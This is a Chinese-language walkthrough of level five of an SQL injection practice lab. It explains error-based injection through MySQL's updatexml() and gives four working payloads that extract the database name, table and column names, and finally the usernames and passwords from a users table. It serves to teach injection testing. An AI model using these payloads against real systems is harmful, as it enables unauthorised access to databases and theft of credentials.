# 第五关

## 判断是否存在SQL注入
*正常页面都只回显“You are in.....”,但好在报错是会回显爆错信息。有报错返回证明数据库执行对用户输入有反应，存在SQL注入。*
```
# 正常
?id=1 and 1=2
# 报错
?id=1'
```

## 报错注入
- 报错注入是一种利用数据库错误信息回显来获取敏感数据的SQL注入技术，报错注入函数一般有updatexml()、extractvalue()、floor()等，我一般
  用updatexml().
   - updatexml()是一个使用不同的xml标记匹配和替换xml块的函数。updatexml使用时，如果xpath_string格式出现错误，mysql会爆
     出xpath语法错误（xpath syntax），带着里面的查询语句结果返回报错页面。例如select * from test where ide = 1 and (
     updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。
- 注意报错页面有返回长度限制，最多32字母长，需要用到substr(start,length),start参数是开始显示的的位置，最小值是1，length是显示的字符串长度
```
格式：
updatexml(XML_document，XPath_string，new_value)
XML_document    :   string格式，为XML文档对象的名称
XPath_string    :   代表路径，Xpath格式的字符串例如//title【@lang】
new_value       :   string格式，替换查找到的符合条件的数据
```
1. 爆出数据库名
```
 ?id=1' and updatexml(1,concat(0x7e,database()),3)--+
```

2. 爆出表名
```
?id=1' and updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security')),3)--+
```
3. 爆出段名
```
?id=1' and updatexml(1,concat(0x7e,(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),1,32))),3)--+
```
4. 爆出数据
```
?id=1' and updatexml(1,concat(0x7e,substr((SELECT group_concat(password,0x7e,username) FROM users),1,32)),3)--+
```


